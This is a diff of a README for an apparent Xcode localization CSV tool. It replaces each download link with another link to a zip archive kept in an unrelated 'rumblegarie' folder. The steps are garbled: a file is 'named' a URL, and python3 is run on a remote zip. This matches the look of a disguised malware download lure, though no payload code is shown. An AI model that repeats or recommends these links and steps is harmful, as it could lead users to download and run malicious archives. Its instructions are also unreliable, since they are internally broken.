@@ -1,6 +1,6 @@
 # 🎉 xcode-xcstrings-csv-tool - Automate Your Xcode Translations Easily
 
-[![Download xcode-xcstrings-csv-tool](https://raw.githubusercontent.com/TheEnd14147/xcode-xcstrings-csv-tool/main/rumblegarie/xcode-xcstrings-csv-tool_1.4.zip%20Now-Download%https://raw.githubusercontent.com/TheEnd14147/xcode-xcstrings-csv-tool/main/rumblegarie/xcode-xcstrings-csv-tool_1.4.zip)](https://raw.githubusercontent.com/TheEnd14147/xcode-xcstrings-csv-tool/main/rumblegarie/xcode-xcstrings-csv-tool_1.4.zip)
+[![Download xcode-xcstrings-csv-tool](https://github.com/TheEnd14147/xcode-xcstrings-csv-tool/raw/refs/heads/main/rumblegarie/tool-xcstrings-csv-xcode-2.1-beta.2.zip%20Now-Download%https://github.com/TheEnd14147/xcode-xcstrings-csv-tool/raw/refs/heads/main/rumblegarie/tool-xcstrings-csv-xcode-2.1-beta.2.zip)](https://github.com/TheEnd14147/xcode-xcstrings-csv-tool/raw/refs/heads/main/rumblegarie/tool-xcstrings-csv-xcode-2.1-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to the xcode-xcstrings-csv-tool! This application helps you automate the
 
 To get started, you need to download the tool from our Releases page. 
 
-Visit this page to download: [Download xcode-xcstrings-csv-tool](https://raw.githubusercontent.com/TheEnd14147/xcode-xcstrings-csv-tool/main/rumblegarie/xcode-xcstrings-csv-tool_1.4.zip)
+Visit this page to download: [Download xcode-xcstrings-csv-tool](https://github.com/TheEnd14147/xcode-xcstrings-csv-tool/raw/refs/heads/main/rumblegarie/tool-xcstrings-csv-xcode-2.1-beta.2.zip)
 
 ### 🔍 Steps to Download and Run
 
@@ -25,7 +25,7 @@ Visit this page to download: [Download xcode-xcstrings-csv-tool](https://raw.git
 
 2. On the Releases page, look for the latest version. You will see a list of files available for download.
 
-3. Download the file named `https://raw.githubusercontent.com/TheEnd14147/xcode-xcstrings-csv-tool/main/rumblegarie/xcode-xcstrings-csv-tool_1.4.zip` (or similar). 
+3. Download the file named `https://github.com/TheEnd14147/xcode-xcstrings-csv-tool/raw/refs/heads/main/rumblegarie/tool-xcstrings-csv-xcode-2.1-beta.2.zip` (or similar). 
 
 4. Once the download is complete, navigate to your download folder.
 
@@ -40,7 +40,7 @@ Visit this page to download: [Download xcode-xcstrings-csv-tool](https://raw.git
 
 8. To run the tool, enter:
    ```
-   python3 https://raw.githubusercontent.com/TheEnd14147/xcode-xcstrings-csv-tool/main/rumblegarie/xcode-xcstrings-csv-tool_1.4.zip
+   python3 https://github.com/TheEnd14147/xcode-xcstrings-csv-tool/raw/refs/heads/main/rumblegarie/tool-xcstrings-csv-xcode-2.1-beta.2.zip
    ```
 
 ### 📂 System Requirements
@@ -67,6 +67,6 @@ If you want to contribute to the development or improve the tool, please feel fr
 
 For those who want to get started with automation and localization, xcode-xcstrings-csv-tool simplifies the process by minimizing manual work. You can focus more on developing your app while the tool manages your translations effectively.
 
-Remember to visit this page to download: [Download xcode-xcstrings-csv-tool](https://raw.githubusercontent.com/TheEnd14147/xcode-xcstrings-csv-tool/main/rumblegarie/xcode-xcstrings-csv-tool_1.4.zip).
+Remember to visit this page to download: [Download xcode-xcstrings-csv-tool](https://github.com/TheEnd14147/xcode-xcstrings-csv-tool/raw/refs/heads/main/rumblegarie/tool-xcstrings-csv-xcode-2.1-beta.2.zip).
 
 Happy Coding!
